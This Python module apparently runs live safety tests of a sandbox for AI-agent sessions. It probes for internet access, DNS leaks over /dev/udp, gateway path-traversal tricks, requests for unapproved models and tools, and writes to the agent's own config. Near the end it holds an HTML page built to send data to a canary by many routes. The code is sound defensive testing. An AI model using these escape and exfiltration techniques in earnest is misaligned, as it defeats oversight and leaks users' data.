"""The Safety check: live tests of DataLab's promises (docs/SAFETY.md).

It starts a temporary probe session of each kind, using the same containers,
gateway, relay, and tools as a real session, then tries the things a
misbehaving agent might try: reaching the internet, resolving outside names,
using hosted tools, sneaking past the gateway, finding keys, changing its
own configuration. It also asks the database what a DataLab session can do.

How it decides:
- "Blocked" means a request never arrived. Routes that lead to this computer
  are tested with canaries (canary.py); a canary that's hit is a failure.
  Private-network routes count as blocked only if the connection fails or the
  research proxy explicitly denies it, never because something answered 401
  or 404.
- A check may be skipped only when it doesn't apply, for example no U-M key
  saved or a development image. Such skips have `required=False`. Any other
  skip means DataLab couldn't verify a promise, and strict mode (used by CI)
  counts it as a failure.
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import os
import re
import secrets
import shutil
import threading
from collections.abc import AsyncIterator, Callable
from contextlib import asynccontextmanager
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import TYPE_CHECKING, Literal

import httpx

from datalab.config import Settings
from datalab.credentials import MissingCredential, oracle_password
from datalab.data.oracle import NotSyntheticDatabase, OracleDatabase
from datalab.repos.github import saved_token_values
from datalab.safety import policy
from datalab.safety.canary import Canaries
from datalab.sessions.checkpoints import Checkpoints
from datalab.sessions.containers import SessionContainers, SessionPaths, docker, instance_of
from datalab.sessions.tokens import SessionAccess, SessionKind, SessionTokens

if TYPE_CHECKING:
    from datalab.api.files import Previews

Status = Literal["pass", "fail", "skip"]

PROMISE_HOST = "The AI can't touch anything else on your computer"
PROMISE_DATABASE = "The AI can't change or damage the research database"
PROMISE_NETWORK = "Sensitive data only goes to approved places"

# Limits for connecting and for each round trip of the privileges check. An
# Oracle login can still hang past them (a listener that accepts and never
# answers), so the check also runs in a daemon thread that it stops waiting
# for after _DATABASE_TIMEOUT: it never holds DataLab up, or its exit.
_DATABASE_STEP_TIMEOUT = 10
_DATABASE_TIMEOUT = 60


@dataclass
class CheckResult:
    id: str
    promise: str
    label: str
    status: Status
    detail: str = ""
    # False only when a skip means "doesn't apply here", not "couldn't verify".
    required: bool = True


@dataclass
class SafetyReport:
    started_at: str
    finished_at: str = ""
    results: list[CheckResult] = field(default_factory=list)

    @property
    def passed(self) -> bool:
        return all(r.status != "fail" for r in self.results)

    @property
    def passed_strict(self) -> bool:
        """No failures, and nothing required was left unverified."""
        return self.passed and not any(r.status == "skip" and r.required for r in self.results)

    def to_dict(self) -> dict:
        return {**asdict(self), "passed": self.passed, "passed_strict": self.passed_strict}


class SafetyCheck:
    def __init__(
        self,
        settings: Settings,
        tokens: SessionTokens,
        canaries: Canaries,
        *,
        model_key: Callable[[], str],
        containers: type[SessionContainers] = SessionContainers,
        previews: Previews | None = None,
        # The saved GitHub tokens, to look for (never shown).
        github_tokens: Callable[[], list[str]] = saved_token_values,
    ) -> None:
        self._github_tokens = github_tokens
        self._settings = settings
        self._tokens = tokens
        self._canaries = canaries
        self._model_key = model_key
        # Tests swap in deliberately broken containers to prove checks can fail.
        self._containers = containers
        self._previews = previews
        self._port = settings.port

    async def run(self) -> SafetyReport:
        report = SafetyReport(started_at=_now())
        report.results += await self._database_checks()
        async with self._probe("data") as probe:
            data_results = await self._data_session_checks(probe)
        report.results += data_results
        model_reachable = any(
            r.id == "model_reachable" and r.status == "pass" for r in data_results
        )
        async with self._probe("research") as probe:
            report.results += await self._research_session_checks(probe, model_reachable)
        report.results.append(await self._image_check())
        report.results.append(await self._browser_policy_check())
        report.results.append(await self._preview_check())
        report.finished_at = _now()
        return report

    # Probe sessions -------------------------------------------------------

    @asynccontextmanager
    async def _probe(self, kind: SessionKind) -> AsyncIterator[_Probe]:
        session_id = f"safety_{secrets.token_hex(4)}"
        paths = SessionPaths(self._settings.data_dir / "safety" / session_id)
        containers = self._containers(
            session_id,
            kind,
            paths,
            agent_image=self._settings.agent_image,
            host_port=self._port,
            profile=self._settings.profile,
            instance=instance_of(self._settings.data_dir),
        )
        token = self._tokens.issue(SessionAccess(session_id, kind, paths.oracle_results))
        paths.create()
        paths.codex_config.write_text("# safety probe\n", encoding="utf-8", newline="\n")
        try:
            await containers.start(token)
            yield _Probe(containers, paths)
        finally:
            self._tokens.revoke_session(session_id)
            await containers.remove()

    def _host_canaries(self, prefix: str) -> list[str]:
        """Addresses by which a container might reach this computer, each a canary."""
        port = self._port
        return [
            f"http://host.docker.internal:{port}"
            + self._canaries.new(f"{prefix} host.docker.internal"),
            # Docker Desktop's host address, and the Linux Docker bridge gateway.
            f"http://192.168.65.254:{port}" + self._canaries.new(f"{prefix} 192.168.65.254"),
            f"http://172.17.0.1:{port}" + self._canaries.new(f"{prefix} 172.17.0.1"),
        ]

    # Data session ------------------------------------------------------------

    async def _data_session_checks(self, probe: _Probe) -> list[CheckResult]:
        results = []

        # curl exits 0 only if it got a response, of any status, from somewhere.
        reached = []
        for url in ("https://example.com", "http://1.1.1.1"):
            code, _ = await probe.sh(f"curl -sS -m 5 -o /dev/null {_quote(url)}")
            if code == 0:
                reached.append(url)
        host_urls = self._host_canaries("data session →")
        for url in host_urls:
            await probe.sh(f"curl -sS -m 5 -o /dev/null {_quote(url)}")
        reached += self._canaries.hits(host_urls)
        results.append(
            _result(
                "internet_blocked",
                PROMISE_NETWORK,
                "A data session can't reach the internet or this computer",
                not reached,
                f"Reached: {', '.join(reached)}"
                if reached
                else "Web sites, raw addresses, and this computer are unreachable.",
            )
        )

        outside, _ = await probe.sh("getent hosts example.com")
        gateway, _ = await probe.sh("getent hosts gateway")
        # A lookup can carry data in the name even when it fails, so these
        # must not leave the computer at all. The name is unique to this run:
        # scripts/dns-leak-test.sh watches the network for it (in CI).
        leak = f"dnsleak-{secrets.token_hex(6)}"
        await probe.sh(
            f"getent hosts {leak}.example.com; curl -s -m 3 http://{leak}.example.org/;"
            f" bash -c 'for ip in 8.8.8.8 1.1.1.1; do echo {leak} > /dev/udp/$ip/53; done'"
        )
        results.append(
            _result(
                "outside_dns_blocked",
                PROMISE_NETWORK,
                "Outside names don't resolve (no DNS leaks)",
                outside != 0 and gateway == 0,
                ("Only the gateway resolves." if outside != 0 else "example.com resolved.")
                + f" (Lookup marker: {leak}.)",
            )
        )

        models = await probe.http("GET", "http://gateway/v1/models", token=True)
        if models.status == 503 and "no U-M GPT key" in models.body:
            results.append(
                CheckResult(
                    "model_reachable",
                    PROMISE_NETWORK,
                    "U-M GPT is reachable",
                    "skip",
                    "No U-M GPT key is saved.",
                    required=False,
                )
            )
        else:
            results.append(
                _result(
                    "model_reachable",
                    PROMISE_NETWORK,
                    "U-M GPT is reachable",
                    models.status == 200,
                    f"HTTP {models.status}",
                )
            )

        not_refused = []
        # Built on an approved model, so each is refused for what it asks, not the model.
        for label, body, reason in _probes(self._settings.default_model):
            response = await probe.http(
                "POST", "http://gateway/v1/responses", token=True, body=body
            )
            refused = response.status == 403 and "datalab_refused" in response.body
            if not (refused and reason in response.body):
                not_refused.append(f"{label} (HTTP {response.status})")
        results.append(
            _result(
                "hosted_tools_refused",
                PROMISE_NETWORK,
                "Hosted tools, provider-side links, and unapproved models are refused",
                not not_refused,
                "Not refused: " + ", ".join(not_refused)
                if not_refused
                else "Web search, remote MCP, code interpreter, image links, other companies' "
                "models, and ambiguous requests were refused.",
            )
        )

        # Anything other than /v1 and /mcp must stop at the gateway, however
        # the path is disguised. Each attempt targets a canary.
        attempts = {
            "plain path": "{c}",
            "../ after /v1": "/v1/..{c}",
            "encoded ../ after /v1": "/v1/%2e%2e{c}",
            "../ after /mcp": "/mcp/..{c}",
            "double slash": "/{c}",
        }
        canaries = []
        for label, pattern in attempts.items():
            canary = self._canaries.new(f"gateway {label}")
            canaries.append(canary)
            await probe.http("GET", "http://gateway" + pattern.format(c=canary), path_as_is=True)
        leaks = self._canaries.hits(canaries)
        without_token = await probe.http("POST", "http://gateway/mcp", body={})
        if without_token.status != 401:
            leaks.append(f"data tools without a session token → HTTP {without_token.status}")
        results.append(
            _result(
                "gateway_routes_only",
                PROMISE_NETWORK,
                "The gateway only reaches the model relay and data tools",
                not leaks,
                "Reached DataLab through: " + "; ".join(leaks)
                if leaks
                else "Other paths and path tricks stop at the gateway.",
            )
        )

        results.append(await self._no_secrets_in(probe))
        results.append(await self._no_github_token_in(probe, kind="data"))
        results.append(await self._locked_down(probe, kind="data"))
        return results

    # Research session --------------------------------------------------------

    async def _research_session_checks(
        self, probe: _Probe, model_reachable: bool
    ) -> list[CheckResult]:
        results = []
        internet = await probe.http("GET", "https://example.com", proxied=True)
        label = "A research session can reach the internet"
        if internet.status == 0 and not model_reachable:
            results.append(
                CheckResult(
                    "research_internet",
                    PROMISE_NETWORK,
                    label,
                    "skip",
                    "This computer seems to be offline (U-M GPT isn't reachable either).",
                )
            )
        else:
            results.append(
                _result(
                    "research_internet",
                    PROMISE_NETWORK,
                    label,
                    0 < internet.status < 400,
                    f"HTTP {internet.status} from example.com"
                    if internet.status
                    else "No connection through the research proxy.",
                )
            )

        problems = []
        host_urls = self._host_canaries("research session →")
        for url in host_urls:
            await probe.http("GET", url, proxied=True)
        problems += [f"reached {hit}" for hit in self._canaries.hits(host_urls)]
        # Private and link-local networks: blocked only if the proxy explicitly
        # refused, or nothing connected at all.
        for url in ("http://169.254.169.254/", "http://10.0.0.1/", "http://192.168.1.1/"):
            response = await probe.http("GET", url, proxied=True, include_headers=True)
            if response.status != 0 and not _squid_denied(response.body):
                problems.append(f"{url} wasn't refused by the proxy (HTTP {response.status})")
        # Straight to the gateway: the research gateway has no data tools.
        gateway_canary = self._canaries.new("research gateway")
        await probe.http("GET", f"http://gateway{gateway_canary}")
        problems += [f"reached DataLab via {hit}" for hit in self._canaries.hits([gateway_canary])]
        tools = await probe.http("POST", "http://gateway/mcp", token=True, body={})
        if tools.status != 404:
            problems.append(f"the data tools route answered HTTP {tools.status}")
        results.append(
            _result(
                "research_isolated",
                PROMISE_NETWORK,
                "A research session can't reach this computer, the local network, or the data",
                not problems,
                "; ".join(problems)
                if problems
                else "The host, private networks, and data tools are refused.",
            )
        )
        results.append(await self._no_github_token_in(probe, kind="research"))
        results.append(await self._locked_down(probe, kind="research"))
        return results

    # Shared checks -----------------------------------------------------------

    async def _no_secrets_in(self, probe: _Probe) -> CheckResult:
        label = "No U-M GPT key or database password in the container"
        known = [s for s in self._known_secrets() if len(s) >= 8]
        if not known:
            return CheckResult(
                "no_keys_in_container",
                PROMISE_NETWORK,
                label,
                "skip",
                "No keys are saved, so there's nothing to look for.",
                required=False,
            )
        inspect = await probe.inspect()
        environment = json.dumps(inspect.get("Config", {}).get("Env", []))
        found = any(s in environment for s in known)
        for path in _files(probe.paths.root):
            with contextlib.suppress(OSError):
                content = path.read_text(encoding="utf-8", errors="ignore")
                found = found or any(s in content for s in known)
        return _result(
            "no_keys_in_container",
            PROMISE_NETWORK,
            label,
            not found,
            "A key was found in the container's environment or files."
            if found
            else "Checked the environment and every mounted file.",
        )

    async def _no_github_token_in(self, probe: _Probe, *, kind: str) -> CheckResult:
        """The GitHub token is used only by git in DataLab's own process. It
        must not be in the container's environment, command, or any file it
        can see, the lab repos' clones must not be mounted, and the token
        must not be in the clones in plain text either."""
        check_id = f"no_github_token_in_{kind}_session"
        label = f"Your GitHub sign-in never reaches a {kind} session"
        try:
            known = [s for s in self._github_tokens() if len(s) >= 8]
        except Exception:  # no usable keychain: nothing saved to look for
            known = []
        if not known:
            return CheckResult(
                check_id,
                PROMISE_NETWORK,
                label,
                "skip",
                "Not signed in to GitHub, so there's no token to look for.",
                required=False,
            )
        inspect = await probe.inspect()
        config = inspect.get("Config", {})
        started_with = json.dumps([config.get("Env"), config.get("Cmd"), inspect.get("Args")])
        repos = Path(os.path.realpath(self._settings.data_dir / "repos"))
        problems = []
        if any(s in started_with for s in known):
            problems.append("in the container's environment or command")
        if any(_holds(path, known) for path in _files(probe.paths.root)):
            problems.append("in a file the container can see")
        sources = [Path(m.get("Source", "/")) for m in inspect.get("Mounts", [])]
        if any(source == repos or repos in source.parents for source in sources):
            problems.append("the lab repos' clones are mounted in it")
        if any(_holds(path, known) for path in _files(repos)):
            problems.append("stored in plain text in the lab repos' clones")
        return _result(
            check_id,
            PROMISE_NETWORK,
            label,
            not problems,
            "Found: " + "; ".join(problems)
            if problems
            else "Checked its environment, command, mounts and files, and the repo clones.",
        )

    async def _locked_down(self, probe: _Probe, *, kind: str) -> CheckResult:
        inspect = await probe.inspect()
        host = inspect.get("HostConfig", {})
        user = inspect.get("Config", {}).get("User", "")
        mounts = {m["Destination"]: m for m in inspect.get("Mounts", [])}
        expected = {"/work", "/codex-home", "/codex-home/config.toml"} | (
            {"/data/oracle"} if kind == "data" else set()
        )
        problems = []
        if host.get("Privileged"):
            problems.append("privileged")
        if "ALL" not in (host.get("CapDrop") or []):
            problems.append("capabilities not dropped")
        if not any("no-new-privileges" in o for o in host.get("SecurityOpt") or []):
            problems.append("no-new-privileges not set")
        if user in ("", "root", "0"):
            problems.append("runs as root")
        if set(mounts) != expected:
            problems.append(f"unexpected mounts: {sorted(set(mounts) ^ expected)}")
        if any("docker.sock" in (m.get("Source") or "") for m in mounts.values()):
            problems.append("Docker socket mounted")
        for readonly in ("/codex-home/config.toml", "/data/oracle"):
            if readonly in mounts and mounts[readonly].get("RW"):
                problems.append(f"{readonly} is writable")
        networks = list(inspect.get("NetworkSettings", {}).get("Networks", {}))
        if networks != [probe.containers.network]:
            problems.append(f"on networks {networks}")
        home_visible, _ = await probe.sh(f"test -e {_quote(str(Path.home()))}")
        if home_visible == 0:
            problems.append("your home folder is visible")
        config_writable, _ = await probe.sh("echo x >> /codex-home/config.toml")
        if config_writable == 0:
            problems.append("the agent can change its own configuration")
        return _result(
            f"{kind}_container_locked_down",
            PROMISE_HOST,
            f"The {kind} session's container is sealed",
            not problems,
            "; ".join(problems)
            if problems
            else "Non-root, no capabilities, only its own folders, config read-only, "
            "home folder and Docker socket not visible.",
        )

    async def _database_checks(self) -> list[CheckResult]:
        oracle = self._settings.oracle
        label = "A DataLab database session is read-only"
        if oracle is None:
            return [
                CheckResult(
                    "database_read_only",
                    PROMISE_DATABASE,
                    label,
                    "skip",
                    "No database is configured.",
                    required=False,
                )
            ]
        practice = oracle.require_synthetic_marker
        try:
            database = OracleDatabase(oracle, oracle_password(oracle), self._settings.limits)
            # A worker thread with a time limit, so a slow or unreachable
            # database (off the VPN, say) never stalls the rest of DataLab.
            if _database_worker_busy():
                # A previous check's worker is still stuck: don't add another.
                raise TimeoutError("the previous database check is still waiting for an answer")
            privileges = await _in_daemon_thread(
                lambda: database.session_privileges(timeout=_DATABASE_STEP_TIMEOUT),
                _DATABASE_TIMEOUT,
            )
        except NotSyntheticDatabase:
            return [
                CheckResult(
                    "practice_is_synthetic",
                    PROMISE_DATABASE,
                    "Practice mode is connected to the synthetic database",
                    "fail",
                    "The database on the practice port isn't the synthetic one.",
                )
            ]
        except MissingCredential as error:
            return [CheckResult("database_read_only", PROMISE_DATABASE, label, "skip", str(error))]
        except Exception as error:
            where = "the synthetic database (is it running?)" if practice else "it (on the VPN?)"
            return [
                CheckResult(
                    "database_read_only",
                    PROMISE_DATABASE,
                    label,
                    # The synthetic database is local; not reaching it is a failure.
                    "fail" if practice else "skip",
                    f"Couldn't reach {where}: {str(error)[:200]}",
                )
            ]
        roles_ok = privileges.enabled_roles == set(oracle.read_only_roles)
        detail = (
            f"Roles enabled: {', '.join(sorted(privileges.enabled_roles)) or 'none'}. "
            f"System privileges: {', '.join(sorted(privileges.system_privileges))}."
        )
        if privileges.non_read_object_privileges:
            detail += f" Write grants: {sorted(privileges.non_read_object_privileges)}."
        results = [
            _result(
                "database_read_only",
                PROMISE_DATABASE,
                label,
                privileges.is_read_only and roles_ok,
                detail,
            )
        ]
        if practice:
            results.append(
                CheckResult(
                    "practice_is_synthetic",
                    PROMISE_DATABASE,
                    "Practice mode is connected to the synthetic database",
                    "pass",
                    "The synthetic marker table is present.",
                )
            )
        return results

    async def _image_check(self) -> CheckResult:
        image = self._settings.agent_image
        label = "The agent image is the pinned release image"
        if "@sha256:" not in image:
            return CheckResult(
                "agent_image_pinned",
                PROMISE_HOST,
                label,
                "skip",
                f"Development image ({image}); releases pin a digest.",
                required=False,
            )
        pinned = image.split("@", 1)[1]
        digests = await docker(
            "image", "inspect", "-f", "{{json .RepoDigests}}", image, check=False
        )
        return _result(
            "agent_image_pinned", PROMISE_HOST, label, pinned in digests, f"Expected {pinned[:19]}…"
        )

    async def _browser_policy_check(self) -> CheckResult:
        label = "The browser may only contact DataLab itself"
        problems = []
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                for path in ("/", "/api/health"):
                    response = await client.get(f"http://127.0.0.1:{self._port}{path}")
                    header = response.headers.get("content-security-policy", "")
                    problems += [f"{path}: {p}" for p in policy.problems(header)]
        except httpx.HTTPError as error:
            return CheckResult("browser_policy", PROMISE_NETWORK, label, "skip", str(error))
        return _result(
            "browser_policy",
            PROMISE_NETWORK,
            label,
            not problems,
            "; ".join(problems) if problems else "The security policy allows only DataLab itself.",
        )

    async def _preview_check(self) -> CheckResult:
        """A hostile page the agent might write, shown the way DataLab shows it."""
        check_id, label = "preview_contained", "A page the agent writes can't contact anything"
        if self._previews is None:
            return CheckResult(check_id, PROMISE_NETWORK, label, "skip", "Previews aren't set up.")
        # The page isn't rendered here: this checks what DataLab would give a
        # browser. Nothing should be left that points at this address.
        canary = self._canaries.new("preview page")
        root = self._settings.data_dir / "safety" / f"preview_{secrets.token_hex(4)}"
        token = None
        try:
            work = root / "work"
            (work / "outputs").mkdir(parents=True)
            (work / "outputs" / "page.html").write_text(
                _HOSTILE_PAGE.replace("CANARY", f"http://127.0.0.1:{self._port}{canary}"),
                encoding="utf-8",
            )
            checkpoints = Checkpoints(root / "store", work)
            latest = await asyncio.to_thread(checkpoints.take, "Safety check")
            entries = {
                rel.removeprefix("outputs/"): entry
                for rel, entry in checkpoints.entries(latest.number).items()
                if rel.startswith("outputs/")
            }
            token = self._previews.share(checkpoints, entries, "outputs/")
            host = (
                self._settings.host if self._settings.host not in ("0.0.0.0", "::") else "127.0.0.1"
            )
            host = f"[{host}]" if ":" in host else host  # an IPv6 address
            folder = f"http://{host}:{self._port}/preview/{token}/"
            async with httpx.AsyncClient(timeout=5) as client:
                framed = await client.get(
                    folder + "page.html", headers={"sec-fetch-dest": "iframe"}
                )
                alone = await client.get(
                    folder + "page.html", headers={"sec-fetch-dest": "document"}
                )
        except (OSError, httpx.HTTPError) as error:
            return CheckResult(check_id, PROMISE_NETWORK, label, "skip", str(error))
        finally:
            if token:
                self._previews.revoke(token)
            await asyncio.to_thread(shutil.rmtree, root, True)
        problems = []
        if framed.status_code != 200:
            problems.append(f"the preview didn't load ({framed.status_code})")
        problems += policy.preview_problems(
            framed.headers.get("content-security-policy", ""), folder
        )
        body = framed.text.lower().replace(_OWN_META, "", 1)
        problems += [f"the page still has {what}" for what in _ACTIVE if what in body]
        if _HANDLER.search(body):
            problems.append("the page still has an event handler")
        if canary.lower() in body:
            problems.append("the page still has an address outside its folder")
        if alone.status_code != 404:
            problems.append("the page opens on its own, outside the viewer's sandboxed frame")
        return _result(
            check_id,
            PROMISE_NETWORK,
            label,
            not problems,
            "; ".join(problems)
            if problems
            else "Scripts, links, and outside addresses are removed, and the page is sandboxed.",
        )

    def _known_secrets(self) -> list[str]:
        found = []
        with contextlib.suppress(MissingCredential):
            found.append(self._model_key())
        if self._settings.oracle is not None:
            with contextlib.suppress(MissingCredential):
                found.append(oracle_password(self._settings.oracle))
        return found


# A page written to send data out, every way a page can. After cleaning,
# none of these may be left, and nothing may point at CANARY.
_HOSTILE_PAGE = """<!doctype html><html><head>
<meta http-equiv="refresh" content="0;url=CANARY?refresh">
<base href="CANARY/">
<link rel="prefetch" href="CANARY?prefetch"><link rel="stylesheet" href="CANARY?css">
<style>@import url("CANARY?import"); body { background: url(CANARY?bg) }</style>
<script>fetch("CANARY?fetch")</script>
</head><body>
<img src="CANARY?img" srcset="CANARY?srcset 2x">
<a href="CANARY?link" ping="CANARY?ping">a link</a>
<form action="CANARY?form"><button>go</button></form>
<iframe src="CANARY?frame"></iframe><object data="CANARY?object"></object>
<video poster="CANARY?poster"><source src="CANARY?video"></video>
<svg><image href="CANARY?svg"/><a href="CANARY?svglink"><text>x</text></a>
<animate attributeName="href" to="CANARY?animate"/></svg>
<div style="background-image:url(CANARY?style)" onclick="fetch('CANARY?onclick')">x</div>
</body></html>
"""
_ACTIVE = ("<script", "http-equiv", "<base", "<iframe", "<object", "<form")
# What DataLab adds to every preview itself.
_OWN_META = '<meta http-equiv="x-dns-prefetch-control" content="off">'
_HANDLER = re.compile(r"<[^>]*\son[a-z]+\s*=", re.IGNORECASE)

# Requests an agent might send straight to the gateway to get U-M's servers to
# reach outside on its behalf, or to reach a model that isn't approved. The
# relay must refuse every one, for the reason given.
_IMAGE_LINK = {"type": "input_image", "image_url": "https://example.com/a.png"}


def _probes(model: str) -> list[tuple[str, dict | str, str]]:
    base = {"model": model, "input": "hello", "store": False}
    message = {"type": "message", "role": "user", "content": [_IMAGE_LINK]}
    return [
        ("web search", {**base, "tools": [{"type": "web_search"}]}, "tool type"),
        (
            "remote MCP",
            {**base, "tools": [{"type": "mcp", "server_url": "https://example.com"}]},
            "tool type",
        ),
        ("code interpreter", {**base, "tools": [{"type": "code_interpreter"}]}, "tool type"),
        ("stored response", {**base, "store": True}, "store"),
        ("image link", {**base, "input": [message]}, "images"),
        ("another company's model", {**base, "model": "claude-opus-5"}, "approved"),
        (
            "duplicate keys",
            '{"model":"claude-opus-5","model":' + json.dumps(model) + ',"store":false}',
            "duplicate",
        ),
    ]


def _squid_denied(response: str) -> bool:
    """True if the research proxy itself refused the request."""
    return "ERR_ACCESS_DENIED" in response


@dataclass
class _HttpResult:
    status: int  # 0 means no connection
    body: str


class _Probe:
    def __init__(self, containers: SessionContainers, paths: SessionPaths) -> None:
        self.containers = containers
        self.paths = paths

    async def sh(self, command: str) -> tuple[int, str]:
        process = await asyncio.create_subprocess_exec(
            "docker", "exec", self.containers.agent, "sh", "-c", command,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
        )  # fmt: skip
        out, _ = await process.communicate()
        return process.returncode or 0, out.decode(errors="replace")

    async def http(
        self,
        method: str,
        url: str,
        *,
        token: bool = False,
        body: dict | str | None = None,
        proxied: bool = False,
        path_as_is: bool = False,
        include_headers: bool = False,
    ) -> _HttpResult:
        parts = ["curl", "-s", "-m", "10", "-X", method, "-w", "'\\n%{http_code}'"]
        if include_headers:
            parts.append("-i")
        if path_as_is:
            parts.append("--path-as-is")
        if not proxied:
            parts.append("--noproxy '*'")
        if token:
            # The token is already in the container's environment; keep it off command lines.
            parts.append('-H "Authorization: Bearer $DATALAB_SESSION_TOKEN"')
        if body is not None:
            parts += [
                "-H 'content-type: application/json'",
                "--data-binary",
                _quote(body if isinstance(body, str) else json.dumps(body)),
            ]
        parts.append(_quote(url))
        _, output = await self.sh(" ".join(parts))
        text, _, code = output.rstrip().rpartition("\n")
        return _HttpResult(int(code) if code.isdigit() else 0, text)

    async def inspect(self) -> dict:
        return json.loads(await docker("inspect", self.containers.agent))[0]


_WORKER_NAME = "datalab-safety-db"


def _database_worker_busy() -> bool:
    return any(t.name == _WORKER_NAME and t.is_alive() for t in threading.enumerate())


async def _in_daemon_thread[T](work: Callable[[], T], timeout: float) -> T:
    """`work()` in a thread of its own, waited for up to `timeout` seconds.

    Unlike asyncio.to_thread, a thread that never returns is abandoned, not
    joined, so it can't stop the program from exiting.
    """
    loop = asyncio.get_running_loop()
    future: asyncio.Future[T] = loop.create_future()

    def settle(result: T | None, error: BaseException | None) -> None:
        if future.done():
            return  # the wait already gave up
        if error is not None:
            future.set_exception(error)
        else:
            future.set_result(result)  # type: ignore[arg-type]

    def run() -> None:
        try:
            outcome: tuple[T | None, BaseException | None] = (work(), None)
        except BaseException as error:  # handed to the waiting task
            outcome = (None, error)
        with contextlib.suppress(RuntimeError):  # the loop has closed
            loop.call_soon_threadsafe(settle, *outcome)

    thread = threading.Thread(target=run, name=_WORKER_NAME, daemon=True)
    thread.start()
    return await asyncio.wait_for(future, timeout)


def _result(check_id: str, promise: str, label: str, ok: bool, detail: str) -> CheckResult:
    return CheckResult(check_id, promise, label, "pass" if ok else "fail", detail)


# Windows reparse tags with this bit set are links of some kind ("name
# surrogates": symlinks, junctions, WSL's Linux symlinks, 0xA000001D). Others
# are regular files with extra handling, such as OneDrive's cloud placeholders
# (0x9000xx1A), which the secret scans should still read.
_NAME_SURROGATE = 0x20000000


def _files(root: Path) -> list[Path]:
    """The regular files under `root`, as they are (links not followed). What
    can't be read is skipped: on Windows, a Linux symlink made in a container
    is a reparse point that `is_file()` raises WinError 1920 on."""
    import stat

    found = []
    for path in root.rglob("*"):
        try:
            info = path.lstat()
        except OSError:
            continue
        if stat.S_ISREG(info.st_mode) and not getattr(info, "st_reparse_tag", 0) & _NAME_SURROGATE:
            found.append(path)
    return found


def _holds(path: Path, secrets: list[str], limit: int = 64 * 1024**2) -> bool:
    try:
        if path.stat().st_size > limit:
            return False
        content = path.read_bytes()
    except OSError:
        return False
    return any(s.encode() in content for s in secrets)


def _quote(text: str) -> str:
    return "'" + text.replace("'", "'\"'\"'") + "'"


def _now() -> str:
    return datetime.now(UTC).isoformat(timespec="seconds")
